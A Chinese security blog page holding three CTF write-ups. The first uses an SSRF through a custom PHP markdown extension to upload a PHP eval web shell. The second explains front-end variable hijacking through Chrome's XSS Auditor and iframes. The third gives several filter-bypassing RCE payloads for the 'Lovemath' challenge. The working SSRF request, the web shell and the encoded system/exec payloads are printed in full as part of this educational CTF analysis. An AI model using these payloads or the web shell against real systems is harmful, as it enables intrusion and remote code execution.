<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在分析post.php时发现函数pmark_include<br><img src="http://static.zybuluo.com/1160307775/ukd6lm5sgej2r6em6aiiu6co/image_1dgtnif22m4n18851r7irll15r42j.png" alt="image_1dgtnif22m4n18851r7irll15r42j.png-22.1kB"></p>
<p>它的作用是解析md为html，但在php官方文档并没有找到这个函数，说明是做题人自己编译出来的。在readme.md中同样提示<code>pmarkdown基于pandoc的php解析markdown拓展</code></p>
<p>当时猜测肯定是这个函数能进行类似于csrf/ssrf的操作，让服务端帮我们上传文件，后续放的提示也证明确实存在一个ssrf的点，只可惜网上基于pandoc的md解析几乎没有php手册。</p>
<p>不过题目给出了编译后的so文件，那么只能分析opcode(垃圾web狗哭了)。</p>
<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>先是逆向so文件。由于是c编译而成，直接拖到ida用f5跟，麻烦pwn师傅教了我一手。下面大致讲一下调用栈，也可能有不对的地方望指正。</p>
<p>看到sub_1850函数发起了本地请求，并且路径为path<br><img src="http://static.zybuluo.com/1160307775/bz59tutn4arpsk619ono03ml/image_1dgv2l7tc14839tceud1invijj30.png" alt="image_1dgv2l7tc14839tceud1invijj30.png-124.9kB"></p>
<p>追踪哪里调用了sub_1850并且path的值从何获取，最终追到发起requests时会调用的回调函数<code>zm_activate_pmarkdown</code><br><img src="http://static.zybuluo.com/1160307775/82o977t6qv6vr4liz6jc4h36/image_1dgv3d6mh1e31eao1pk91moij973d.png" alt="image_1dgv3d6mh1e31eao1pk91moij973d.png-28.8kB"></p>
<p>进行调用的语句如下，不难发现进行了一个对v16参数的判断<br><img src="http://static.zybuluo.com/1160307775/omm1bo25ugdkr1lrz04ioy09/image_1dgv3e7u2gt16cr1et2e8lu553q.png" alt="image_1dgv3e7u2gt16cr1et2e8lu553q.png-38.9kB"></p>
<p>这里就涉及到知识盲区了，由于不会ida的动态调试，没有确定参数值，这里只能从writeup入手分析条件判断的含义。</p>
<p>官方payload:</p>
<pre><code>data=&#39;504f5354202f75706c6f61642e70687020485454502f312e310d0a486f73743a203132372e302e302e313a383038300d0a557365722d4167656e743a204d6f7a696c6c612f352e3020284d6163696e746f73683b20496e74656c204d6163204f5320582031302e31333b2072763a36362e3029204765636b6f2f32303130303130312046697265666f782f36362e300d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a207a682c656e2d55533b713d302e372c656e3b713d302e330d0a526566657265723a20687474703a2f2f3132372e302e302e313a383038302f696e6465782e7068703f6163743d75706c6f61640d0a436f6e74656e742d547970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d4c656e6774683a203234340d0a436f6e6e656374696f6e3a20636c6f73650d0a557067726164652d496e7365637572652d52657175657374733a20310d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d226c6f676f75742e706870220d0a436f6e74656e742d547970653a20746578742f7068700d0a0d0a3c3f706870200d0a6576616c28245f524551554553545b615d293b0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739372d2d0d0a&#39;.replace(&#39;\n&#39;,&#39;&#39;)
data=data.decode(&#39;hex&#39;)
requests.post(url+&#39;/index.php&#39;,data={&#39;debug&#39;:&quot;sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n&quot;%data},timeout=timeout)</code></pre><p>这样不难理解判断的核心即是否存在debug参数，并且对v16取了24位地址偏移后的值传入下一层函数，也就是之前要最终的形参path。</p>
<p>在payload中的形式，相当于传递了两个http包，拼接后如下</p>
<pre><code>POST whatever HTTP/1.1
Host: localhost
Connection: Keep-Alive

POST /upload.php HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh,en-US;q=0.7,en;q=0.3
Referer: http://127.0.0.1:8080/index.php?act=upload
Content-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797
Content-Length: 244
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------6693638881479522630623693797
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell&quot;
Content-Type: text/php

&lt;?php 
eval($_REQUEST[a]);

-----------------------------6693638881479522630623693797--</code></pre><p>此时就可以把两个http包带入之前的path，构造一个完整的http包请求。而服务端在发送http请求时，会对请求包逐一发送。即先请求了<code>whatever</code>，建立http连接，connection:keep-alive 保持http的连接不被中断。</p>
<p>第二次请求data.decode(‘hex’)，让server帮我们请求Upload并上传md文件从而getshell</p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>传了md就能解析php来getshell，只不过是要饶一个disable_function，预期解使用ld_preload去改变环境变量来bypass。不过有师傅提醒df过滤不全用popen也可以执行命令。</p>
<p>逆向功底太差了，有机会可以去抓个包分析一下debug参数的请求流程，最后膜出题师傅的知识渊博</p>

                
            </div>
            <div class="continue">
            <a href="/2019/07/29/CISCN 2019 Final Web11复盘/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/07/02/前端全局变量劫持/"> 
                    前端全局变量劫持 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-07-02   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS测试/">XSS测试</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="前端全局变量劫持"><a href="#前端全局变量劫持" class="headerlink" title="前端全局变量劫持"></a>前端全局变量劫持</h1><p>最近看了wonderkun师傅的一篇文章，觉得还挺有意思的，收获颇丰。决定自己复现研究一下，原文地址：<a href="http://blog.wonderkun.cc/2019/07/01/前端中存在的变量劫持漏洞" target="_blank" rel="noopener">前端中存在的变量劫持漏洞</a></p>
<p>先说一下鸡肋的点，这个变量的劫持也只能是把变量劫持为正常页面的window对象，并不能随意修改变量的值</p>
<h1 id="子页面获取"><a href="#子页面获取" class="headerlink" title="子页面获取"></a>子页面获取</h1><p>首先kun师傅介绍了三种父页面获取子页面windows对象的方式:</p>
<pre><code>document.getElementById(&quot;iframe1&quot;).contentWindow;
window.frames[0]; 
window[0] ;</code></pre><p>id值是一个全局变量，下例中test这个”id值”就代表iframe标签。也可以通过直接调用iframe内的name属性值获取该iframe的window对象<br><img src="http://static.zybuluo.com/1160307775/8n1kln6kltgkylriy0rutpd9/image_1df3psct91n0slcp85prp177u9.png" alt="image_1df3psct91n0slcp85prp177u9.png-60.3kB"></p>
<h1 id="利用filter模式删除变量"><a href="#利用filter模式删除变量" class="headerlink" title="利用filter模式删除变量"></a>利用filter模式删除变量</h1><p>无论是javascript还是调用标签，都无法覆盖已经定义的变量，但是却可以定义新的变量。</p>
<p>怎么让页面中出现未定义的全局变量呢？kun师傅提到chrome74之后，默认的xss auditor 从block模式编程了filter模式，可以利用这个删除掉页面中的代码。也就是说我们用一段xss代码触发chrome xss auditor删除xss引用的变量，从而达到替我们删除正常变量的目的。</p>
<p>这里简单介绍一下xss auditor</p>
<h2 id="XSS-Auditor"><a href="#XSS-Auditor" class="headerlink" title="XSS-Auditor"></a>XSS-Auditor</h2><p>XSS-Auditor是chrome默认开启的，也可以选择在header中关闭Auditor</p>
<pre><code>X-XSS-Protection: 0</code></pre><p>它的检测机制如文档中的描述<br><img src="http://static.zybuluo.com/1160307775/78neclm89yli79mwd4htps6z/image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png" alt="image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png-126.6kB"></p>
<p>XSS Auditor采用黑名单方法来识别请求参数中提供的危险字符和标签。它还将查询参数与内容进行匹配以识别注入点。如果查询参数无法与响应中的内容匹配，则不会触发Auditor。</p>
<p>不过文档也有提到，基于上下文的检测的局限性使Auditor无法预防一些针对应用层的payload，这里不做深究。</p>
<h2 id="删除变量demo"><a href="#删除变量demo" class="headerlink" title="删除变量demo"></a>删除变量demo</h2><pre><code>&lt;script&gt;var hpdoger = &quot;remove me&quot;;&lt;/script&gt;</code></pre><p>当访问的参数以危险标签的形式出现在response中时，就会触发xss-auditor，成功删除自定义的hpdoger变量。下图可以看到变量被成功删除</p>
<pre><code>http://localhost/iframe.html?xss=%3Cscript%3E%0A%20%20%20%20%20var%20hpdoger%20=%20%22remove%22;%0A%3C/script%3E</code></pre><p><img src="http://static.zybuluo.com/1160307775/c70k199x2qygcxi7z7nmf9fg/image_1df3uoatdojsl0fksa1e3b1nb21t.png" alt="image_1df3uoatdojsl0fksa1e3b1nb21t.png-112.7kB"></p>
<h1 id="bypass同源之iframe"><a href="#bypass同源之iframe" class="headerlink" title="bypass同源之iframe"></a>bypass同源之iframe</h1><p>众所周知，用iframe去加载子页面会被同源限制(除非是cors配置的白名单)<br><img src="http://static.zybuluo.com/1160307775/98cjog73vc1fxs6fuei5nypt/image_1df3vq1ivipk1qo3a383ao1lnd2n.png" alt="image_1df3vq1ivipk1qo3a383ao1lnd2n.png-93.8kB"></p>
<p><strong>如果儿子页面也存在iframe</strong>(划重点)，先通过操纵孙子c页面window对象来设置location，使其指向父页面a，这样父页面a和子页面b就同源了。之后再修改孙子页面c中window对象的name，其作用结果是：name作用域在子页面b的全局变量。</p>
<h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>这里不重复造轮子了，引用kun师傅的文章：<a href="https://xz.aliyun.com/t/5565#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/5565#toc-4</a></p>
<h2 id="孙子页面c"><a href="#孙子页面c" class="headerlink" title="孙子页面c"></a>孙子页面c</h2><p>任意的页面</p>
<h2 id="子页面b"><a href="#子页面b" class="headerlink" title="子页面b"></a>子页面b</h2><p><img src="http://static.zybuluo.com/1160307775/mz1lfmzmxftl49tvbpeh5lxn/image_1df5h2g811eg76b3bdo1v0b18dqm.png" alt="image_1df5h2g811eg76b3bdo1v0b18dqm.png-53.8kB"></p>
<h2 id="父页面a"><a href="#父页面a" class="headerlink" title="父页面a"></a>父页面a</h2><p>第一步很关键的一点就是修改c页面的location指向a。之后a页面就可以调用b的变量，同时通过iframe触发b页面的xss auditor<br><img src="http://static.zybuluo.com/1160307775/86zy0vdrthffjgmulc9qqu9c/image_1df5grfcl16f71ejc1j5upqr10re9.png" alt="image_1df5grfcl16f71ejc1j5upqr10re9.png-127.5kB"></p>
<p>第二步修改孙子页面c的name，从而帮b页面注册一个全局变量名为”hpdoger”<br><img src="http://static.zybuluo.com/1160307775/4qeb5di2v560f26o9jdr9804/image_1df5h8abti9j1bptl671to1e3213.png" alt="image_1df5h8abti9j1bptl671to1e3213.png-72.1kB"></p>
<p>这样就成功替换掉b页面的hpdoger变量，同时a页面也可以访问b页面这个全局变量hpdoger(但是不能访问b的其他变量。因为我们通过c页面做跳板，只能访问c的属性间接访问到b的变量，我叫他”同名法则”)。不过前文也提到了这个鸡肋的地方，就是一个变量替换成window对象，受用面很有限。。</p>

                
            </div>
            <div class="continue">
            <a href="/2019/07/02/前端全局变量劫持/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/"> 
                    2019国赛Web线上题目Lovemath多解WP 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-04-23   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="2019国赛Web线上题目Lovemath多解WP"><a href="#2019国赛Web线上题目Lovemath多解WP" class="headerlink" title="2019国赛Web线上题目Lovemath多解WP"></a>2019国赛Web线上题目Lovemath多解WP</h1><p>题目质量很不错，这题整整做了七个小时，从一开始想着拿一血到后来的自闭。</p>
<h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><pre><code class="php">&lt;?php 
error_reporting(0); 
//听说你很喜欢数学，不知道你是否爱它胜过爱flag 
if(!isset($_GET[&#39;c&#39;])){ 
    show_source(__FILE__); 
}else{ 
    //例子 c=20-1 
    $content = $_GET[&#39;c&#39;]; 
    if (strlen($content) &gt;= 80) { 
        die(&quot;太长了不会算&quot;); 
    } 
    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;]; 
    foreach ($blacklist as $blackitem) { 
        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) { 
            die(&quot;请不要输入奇奇怪怪的字符&quot;); 
        } 
    } 
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp 
    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs); 
    foreach ($used_funcs[0] as $func) { 
        if (!in_array($func, $whitelist)) { 
            die(&quot;请不要输入奇奇怪怪的函数&quot;); 
        } 
    } 
    //帮你算出答案 
    eval(&#39;echo &#39;.$content.&#39;;&#39;); 

}</code></pre>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>代码有一个黑名单blacklist&amp;白名单whitelist。黑名单肯定是绕不过去，虽然正则给了/m模式的情况下可以采用换行绕过，但是\r也在封杀范围所以直接pass。注意看whitelist后面的逻辑：正则匹配所有字母，用foreach逐个比对匹配的字母。<br><img src="http://static.zybuluo.com/1160307775/rd7dioxl1v60noellw9opm0m/image_1d94aluchp6k1a607ht1ml2132q9.png" alt="image_1d94aluchp6k1a607ht1ml2132q9.png-224.4kB"></p>
<p>也就是说只允许Eval使用白名单的函数做字符串</p>
<p>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="http://static.zybuluo.com/1160307775/73g78cw6hxwdepx0wny3oloy/image_1d9419hr91e511p621k4l177k1a5726.png" alt="image_1d9419hr91e511p621k4l177k1a5726.png-31.6kB"></p>
<p>想办法把数字变成字母，再通过eval进行RCE。着眼于函数base_convert，官方描述如下<br><img src="http://static.zybuluo.com/1160307775/u1tsyajx6w5bpj9o8bksaa6e/image_1d94aoodi184tdml1udl7q91b0gm.png" alt="image_1d94aoodi184tdml1udl7q91b0gm.png-126.9kB"></p>
<p>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字到字母的转化，成功打印phpinfo如下<br><img src="http://static.zybuluo.com/1160307775/6otny6nfb85kfltkdhoutv2b/image_1d94ard4e1orte5mo6a1oj6hjj1j.png" alt="image_1d94ard4e1orte5mo6a1oj6hjj1j.png-396.7kB"></p>
<h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><p>因为字符串长度限制，我最开始的想法是这样的：</p>
<pre><code>$input = hexdec(bin2hex(&quot;system(&#39;cat /flag&#39;);&quot;))
$result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</code></pre><p>完整转换是这样：</p>
<pre><code>base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</code></pre><p>但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下</p>
<pre><code>base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</code></pre><p><img src="http://static.zybuluo.com/1160307775/xtgdey8iv615ywg0w55fxfay/image_1d941nbdm171k17a3lhg16ii1knh3q.png" alt="image_1d941nbdm171k17a3lhg16ii1knh3q.png-24.3kB"></p>
<p>正好79个字母堪称完美…解码后的调用栈如下<br><img src="http://static.zybuluo.com/1160307775/u3la0kpp7bgngowxzez2nx21/image_1d941l8bp14ag1cq1eil1hi57ti3d.png" alt="47138-&gt;exec"></p>
<h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><p>这个是看到ROIS队伍师傅的poc</p>
<pre><code>$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})</code></pre><p>解码出来是<code>system(getallheaders(){9})</code></p>
<p>也是很聪明的解法。变量赋值pi减少长度，用getallheaders动态传入参数，之前在code puzzle中见过这样的用法</p>
<h1 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h1><p>这种就是比赛时我的解法。一种小数还原的思路。我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。Payload如下，注意用白名单的值作为变量参数，否则还是会被waf</p>
<pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$p){1})</code></pre><p>转换的调用栈如下：<br><img src="http://static.zybuluo.com/1160307775/pwdw95ivta0rswwvhukw4mk0/image_1d94271vhpqtbtv1mk1v7upa047.png" alt="image_1d94271vhpqtbtv1mk1v7upa047.png-32.8kB"></p>
<p>直接发包给到C参数，成功getflag。<br><img src="http://static.zybuluo.com/1160307775/kbdgi0lo22k9ho6p51u4c325/image_1d9427hgv862p0f8bluecra94k.png" alt="image_1d9427hgv862p0f8bluecra94k.png-83.5kB"></p>

                
            </div>
            <div class="continue">
            <a href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
</section>

  <nav class="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
  </nav>

    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>